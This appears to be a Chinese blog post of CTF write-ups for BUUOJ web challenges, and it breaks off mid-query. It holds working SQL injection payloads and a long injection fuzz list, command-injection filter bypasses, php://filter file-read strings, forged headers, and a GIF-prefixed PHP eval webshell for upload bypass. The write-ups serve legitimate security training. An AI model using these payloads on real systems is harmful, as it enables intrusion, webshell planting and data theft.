    <content type="html"><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码注入：’ or 1=1#</p><p>分析一下为什么这可以进后台，如果sql语句这样写：select * from admin where name=’”.$_POST[‘name’].”‘and password=’”.$_POST[‘password’].”‘“ 　　如果我们在账号处输入万能密码’or 1=1#</p><p>#后面的语句将会被注释掉，前面的条件就为真,这样无论我们输入什么密码，都可以进入了。</p><p>这有个小提示，存在字符型注入的php网站是可以用万能密码’or 1=1#来注入的</p><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>应该算是一道比较简单的php代码审计，查看网页源码可以知道php代码在/source.php</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    {</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        {</span><br><span class="line">            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];</span><br><span class="line">            if (! isset($page) || !is_string($page)) {</span><br><span class="line">                echo "you can't see it";</span><br><span class="line">                return false;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) {</span><br><span class="line">                return true;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . '?', '?')</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) {</span><br><span class="line">                return true;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . '?', '?')</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) {</span><br><span class="line">                return true;</span><br><span class="line">            }</span><br><span class="line">            echo "you can't see it";</span><br><span class="line">            return false;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST['file'])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST['file'])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST['file'])</span><br><span class="line">    ) {</span><br><span class="line">        include $_REQUEST['file'];</span><br><span class="line">        exit;</span><br><span class="line">    } else {</span><br><span class="line">        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";</span><br><span class="line">    }  </span><br><span class="line">?&gt; </span><br></pre></td></tr></tbody></table></figure><p>进入/hint.php,可以看到打印了4次flag，直接目录穿越/file=hint.php?../../../../../ffffllllaaaagggg</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><img src="https://tuchuangs.com/imgs/2022/10/14/241905f313b3cb6e.png"></p><p>看源码一眼丁真，直接用get方式给cat传参/?cat=dog</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="https://tuchuangs.com/imgs/2022/10/14/2bb2ba9150e8feea.png">既然该文件名为flag.php，那么flag应该就存在于此文件中，但是我们f12并没有查看到flag，猜测flag应该是在flag.php的源代码当中</p><p>我们可以利用php://filter伪协议来查看flag.php的源代码，构造payload：<code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p><p>可以获得将flag base64加密后的内容</p><h3 id="知识详解"><a href="#知识详解" class="headerlink" title="知识详解"></a>知识详解</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>作用：php://filter可以获取指定文件源码。当其与文件包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行，从而读取任意文件源代码。[1]<br>场景：</p><p>知道flag文件地址后，可以直接用该协议读取文件内容<br>有时候一些关键字被过滤也可以用该协议绕过<br>有的flag隐藏在注释当中，可通过此协议查看源码获取flag</p><p>格式：xxx.php?xxx=php://filter/convert.base64-encode/resource=xxx.php<br>利用条件：</p><p>不受allow_url_include和allow_url_fopen的限制</p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>通过|（按位或）来进行任意命令执行，直接执行后面的指令，0 | ls /查看根目录内容，0| cat /flag打印出flag</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>1，测试 1’ or 1=1 # ,初步判定存在SQL注入。 </p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' or 1=1 #</span></span><br></pre></td></tr></tbody></table></figure><p>再测试字段数，到3时报错，说明字段数为2</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' order by 1 # </span></span><br></pre></td></tr></tbody></table></figure><p>接着尝试union注入,回显了过滤的关键字。</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' union select 1,2#</span></span><br></pre></td></tr></tbody></table></figure><p>堆叠注入：</p><p>先通过show databases爆出数据库。</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">'; show databases; #</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://tuchuangs.com/imgs/2022/10/16/a0b6ae9e9e31c3f8.png"></p><p>然后用 show tables 尝试爆表。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">'; show tables; #</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://img-blog.csdnimg.cn/20191126153703437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p><p>可以看到这里有两个表，我们先爆words表的内容。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">'; show columns from words; #</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://img-blog.csdnimg.cn/2019112615410246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p><p>这里一个知识点，表名为数字时，要用反引号包起来查询。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">'; show columns from `1919810931114514`; #</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://img-blog.csdnimg.cn/20191126154451163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p><p>解题思路：</p><p>1，通过 rename 先把 words 表改名为其他的表名。</p><p>2，把 1919810931114514 表的名字改为 words 。</p><p>3 ，给新 words 表添加新的列名 id 。</p><p>4，将 flag 改名为 data 。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></tbody></table></figure><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>和前一题比较像，先尝试下堆叠注入</p><figure class="highlight dart"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> tables;</span><br><span class="line">Array ( [<span class="number">0</span>] =&gt; <span class="number">1</span> ) Array ( [<span class="number">0</span>] =&gt; Flag ) </span><br></pre></td></tr></tbody></table></figure><p>输入1;show columns from Flag，返回的内容是Nonono,查一下过滤了哪些词</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">"http://2bc458c5-21ff-4740-b290-024b3fd90a35.node4.buuoj.cn:81"</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'sql-fuzz.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        data = {<span class="string">"query"</span>: line}</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'Nonono'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            <span class="built_in">print</span>(line.strip(),end=<span class="string">"\n"</span>)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">“or “a”=“a</span><br><span class="line">')or(‘a’=‘a</span><br><span class="line">or 1=1–</span><br><span class="line">‘or 1=1–</span><br><span class="line">a’or’ 1=1–</span><br><span class="line">"or 1=1–</span><br><span class="line">‘or’a’=‘a</span><br><span class="line">“or”="a’=‘a</span><br><span class="line">‘or’’=’</span><br><span class="line">‘or’=‘or’</span><br><span class="line">1 or ‘1’=‘1’=1</span><br><span class="line">1 or ‘1’=‘1’ or 1=1</span><br><span class="line">'OR 1=1</span><br><span class="line">“or 1=1</span><br><span class="line">'xor</span><br><span class="line">‘or 1=1/*</span><br><span class="line">1’or’1’=‘1</span><br><span class="line">a’ or 1=1–</span><br><span class="line">“a”” or 1=1–”</span><br><span class="line">or a = a</span><br><span class="line">a’ or ‘a’ = ‘a</span><br><span class="line">1 or 1=1</span><br><span class="line">a’ waitfor delay ‘0:0:10’–</span><br><span class="line">1 waitfor delay ‘0:0:10’–</span><br><span class="line">’ or 1=1</span><br><span class="line">ý or 1=1 –</span><br><span class="line">x’ AND userid IS NULL; –</span><br><span class="line">x’ AND email IS NULL; –</span><br><span class="line">anything’ OR ‘x’=‘x</span><br><span class="line">x’ AND 1=(SELECT COUNT() FROM tabname); –</span><br><span class="line">x’ AND members.email IS NULL; –</span><br><span class="line">x’ OR full_name LIKE ‘%Bob%</span><br><span class="line">23 OR 1=1</span><br><span class="line">‘%20or%20’’=’</span><br><span class="line">‘%20or%20’x’='x</span><br><span class="line">%20or%20x=x</span><br><span class="line">‘)%20or%20(‘x’=‘x</span><br><span class="line">0 or 1=1</span><br><span class="line">’ or 0=0 –</span><br><span class="line">" or 0=0 –</span><br><span class="line">or 0=0 –</span><br><span class="line">’ or 0=0 #</span><br><span class="line">) or (a=a</span><br><span class="line">hi or a=a</span><br><span class="line">hi or 1=1 --"</span><br><span class="line">hi’ or 1=1 –</span><br><span class="line">hi’ or ‘a’=‘a</span><br><span class="line">hi’) or (‘a’='a</span><br><span class="line">“hi”") or ("“a”"="“a”</span><br><span class="line">‘hi’ or ‘x’=‘x’;</span><br><span class="line">insert</span><br><span class="line">or</span><br><span class="line">order by</span><br><span class="line">delete</span><br><span class="line">update</span><br><span class="line">like</span><br><span class="line">handler</span><br><span class="line">’ or username like '%</span><br><span class="line">’ or uname like '%</span><br><span class="line">’ or userid like '%</span><br><span class="line">’ or uid like '%</span><br><span class="line">’ or user like '%</span><br><span class="line">–sp_password</span><br><span class="line">\x27UNION SELECT</span><br><span class="line">’ UNION SELECT</span><br><span class="line">’ UNION ALL SELECT</span><br><span class="line">’ or (EXISTS)</span><br><span class="line">&amp;</span><br><span class="line">’ or ‘’=’</span><br><span class="line">x’ or 1=1 or ‘x’='y</span><br><span class="line">a’ or 3=3–</span><br><span class="line">“a”" or 3=3–"</span><br><span class="line">’ or 3=3</span><br><span class="line">ý or 3=3 –</span><br><span class="line">"</span><br><span class="line">‘or select *</span><br><span class="line">’ or ‘x’=‘x</span><br><span class="line">" or “x”=“x</span><br><span class="line">‘) or (‘x’=‘x</span><br><span class="line">" or 0=0 #</span><br><span class="line">"’ or 1 --’”</span><br><span class="line">" or 1=1 or “”="</span><br><span class="line">" or “a”="a</span><br><span class="line">“) or (“a”=“a</span><br><span class="line">hi” or “a”=“a</span><br><span class="line">hi” or 1=1 –</span><br><span class="line">hi”) or (“a”=“a</span><br><span class="line">&lt;&gt;”’%😉(&amp;+</span><br><span class="line">’ and ‘’ like ’</span><br></pre></td></tr></tbody></table></figure><p>查询网上的wp</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入1</span><br><span class="line"></span><br><span class="line">Array ( [<span class="number">0</span>] =&gt; <span class="number">1</span> ) </span><br><span class="line"></span><br><span class="line">输入0或者其他字母均没有回显</span><br><span class="line"></span><br><span class="line">输入上面过滤的字符会显示Nonono.</span><br></pre></td></tr></tbody></table></figure><p>综上，可以猜测后台的SQL语句</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_GET['query'] || flag from Flag</span><br></pre></td></tr></tbody></table></figure><p>||的特点是如果前面为真，后面就不会执行，那么我们传入*,1之后语句就会变成select *,1 from Flag，而1会在表添加一列1，所以得到flag</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>打开靶场只有一个ip，尝试给他127.0.0.1试一试</p><p><img src="https://tuchuangs.com/imgs/2022/10/18/1c74d0d28ed8bad3.png">可以看到是ping了输入的地址，联想到前面做过的题用|可以执行后面的命令？ip=127.0.0.1|ls可以看到</p><p><img src="https://tuchuangs.com/imgs/2022/10/18/c88b59ba0ff56de7.png"></p><p>是可以执行的，但是经过后面一系列的尝试可以知道过滤了flag和空格，所以用?ip=127.0.0.1|cat$IFS$1index.php来得到源码</p><p>空格绕过方式</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">${IFS}</span><br><span class="line">$IFS$1 </span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">{cat,flag.php} //用逗号实现空格功能</span><br><span class="line">%09//需要php环境</span><br></pre></td></tr></tbody></table></figure><p>源码：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){</span><br><span class="line">    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);</span><br><span class="line">    die("fxck your symbol!");</span><br><span class="line">  } else if(preg_match("/ /", $ip)){</span><br><span class="line">    die("fxck your space!");</span><br><span class="line">  } else if(preg_match("/bash/", $ip)){</span><br><span class="line">    die("fxck your bash!");</span><br><span class="line">  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){</span><br><span class="line">    die("fxck your flag!");</span><br><span class="line">  }</span><br><span class="line">  $a = shell_exec("ping -c 4 ".$ip);</span><br><span class="line">  echo "</span><br><span class="line"></span><br><span class="line">";</span><br><span class="line">  print_r($a);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure><p>也就是说，使用正则匹配对参数，例如{},&lt;&gt;，* ,?，空格，bash，flag等进行了过滤，才会有我们刚才看到的各种提示<br>这里观察到有个a变量，使用shell_exec命令进行了shell命令执行，然后将结果返回到a变量中,最后输出a shell_exec命令<br>ps:这里的ping -c 4就是发送4条请求<br>在这里插入图片描述<br>参考大佬们的wp<br>尝试利用a进行变量覆盖绕过flag过滤<br>构造payload：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></tbody></table></figure><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>看源码可以看到一个Archive_room.php，访问试一试可以看到一个按钮，按了之后快速跳过一个页面，使用bp抓包，有一个secr3t.php可以访问，访问后写着flag在flag.php，再直接访问flag.php说无法看到</p><p> php://filter是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 </p><ul><li><code>include “test.php”</code> php文件包含，在执行流中插入写在其他文件中的有用的代码。读取的时候也是数据流形式，因此可以使用<code>php://filter</code>进行过滤，返回值为0,1。 </li><li><code>readfile(“test.php”)</code>是将文件以数据流的形式读取过来，并不会执行，但会在前台浏览器上进行解析。返回值是字节数多少。</li></ul><p>payload=/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>使用万能密码：1’ or 1=1 #</p><p>登录进admin，但是里面只有一个admin的密码，尝试后不是flag，重新使用这个密码登录也不会出现flag</p><p>回到注入的思路上，查询字段数：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin' order by 3%23&amp;password=1     存在</span><br><span class="line">/check.php?username=admin' order by 4%23&amp;password=1     报错</span><br></pre></td></tr></tbody></table></figure><p><img src="https://tuchuangs.com/imgs/2022/10/19/2841b101dec73ff8.png"></p><p>可知共3个字段。用<code>union</code>查询测试注入点（回显点位）：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1' union select 1,2,3%23&amp;password=1</span><br></pre></td></tr></tbody></table></figure><p>得到回显点位为2和3，查询当前数据库名及版本：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1' union select 1,database(),version()%23&amp;password=1</span><br></pre></td></tr></tbody></table></figure><p>可知当前数据库为geek<br> 接下来：<br> 爆表：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1</span><br></pre></td></tr></tbody></table></figure><p>爆出这两个表，我们试一下l0ve1ysq1这个表：<br> 爆字段：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&amp;password=1</span><br></pre></td></tr></tbody></table></figure><p>得到这三个子段，<br> 爆数据：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</span><br></pre></td></tr></tbody></table></figure><p>得到flag</p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1666195536871.png" alt="1666195536871"></p><p>一眼丁真，用中国菜刀直接连上shell</p><p><img src="https://tuchuangs.com/imgs/2022/10/20/1169c6fb3d3eb192.png"></p><p>flag在跟目录下</p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>在网页源码中存在一个Secret.php，并在网页中无正常链接</p><p><img src="https://tuchuangs.com/imgs/2022/10/20/a5667f18a5a235c6.png"></p><p>于是，尝试访问该页面，提示请求源不是<code>It doesn't come from 'https://www.Sycsecret.com'</code>，如下图所示：It doesn’t come from ‘<a href="https://sycsecret.buuoj.cn&amp;/#39;">https://Sycsecret.buuoj.cn'</a></p><p>接下来，就是用burpsuit抓包，<strong>通过指定Referer参数值为<a href="https://sycsecret.buuoj.cn来伪造请求源/">https://Sycsecret.buuoj.cn来伪造请求源</a></strong>，继续尝试访问<code>http://node3.buuoj.cn:29399/Secret.php</code>页面</p><p>通过上面的请求伪造，得到响应页面：提示，需要使用<code>"Syclover" browser</code>浏览器。</p><p>在http请求头中，<strong>通过修改User-Agent参数值为”Syclover” browser来伪造请求源所使用浏览器。</strong></p><p>通过上面的请求伪造，得到响应页面：提示，你只能够在本地读取这个文件！！！</p><p>这是限制了文件访问的源地址，可用<strong>通过X-Forwarded-For参数来伪造访问的源地址</strong>，这里可以修改为<code>127.0.0.1或localhost</code></p><p>最终，伪造的请求头参考如下：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /Secret.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node4.buuoj.cn:<span class="number">29396</span></span><br><span class="line">User-Agent: <span class="string">"Syclover"</span> browser         <span class="comment">#伪造客户端浏览器</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: https://Sycsecret.buuoj.cn    #伪造</span></span><br><span class="line"><span class="comment">X-Forwarded-for: 127.0.0.1             #伪造源地址</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br></pre></td></tr></tbody></table></figure><p>最终得到flag</p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>有个文件上传，上传个一句话木马，显示需要上传png或者jpg文件，改后缀名后还是没用，然后加个前缀GIF89a</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language="php"&gt;eval($_REQUEST[123])&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p>查看源码猜测路径是在upload上面，打开/upload直接显示文件，证明猜测正确</p><p>用中国菜刀一键连上去，flag在根目录下</p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>也是一道文件上传的题目，通过几次尝试（看wp），发现对文件后缀名有过滤，通过查看源码将检查的代码删除</p><p>上传文件名为shell.phtml的一句话木马，中国菜刀直接连</p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>一个和前面几道题一样的登录界面，先尝试一遍万能密码，发现被过滤，尝试双写，发现可以正常登录进去</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' oorr 1=1#</span><br><span class="line">1' oorr 1=1#</span><br></pre></td></tr></tbody></table></figure><p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1666459083218.png" alt="1666459083218"></p><p>接着就是用双写重复之前的sql注入操作</p><p>爆出所有数据库：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(schema_name)frfromom</span><br><span class="line">(infoorrmation_schema.schemata) %23</span><br></pre></td></tr></tbody></table></figure><p>回显：Hello 2！Your password is ‘information_schema,mysql,performance_schema,test,ctf,geek’</p><p>爆破ctf库：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(table_name)frfromom(infoorrmation_schema.tables)</span><br><span class="line">whwhereere table_schema="ctf" 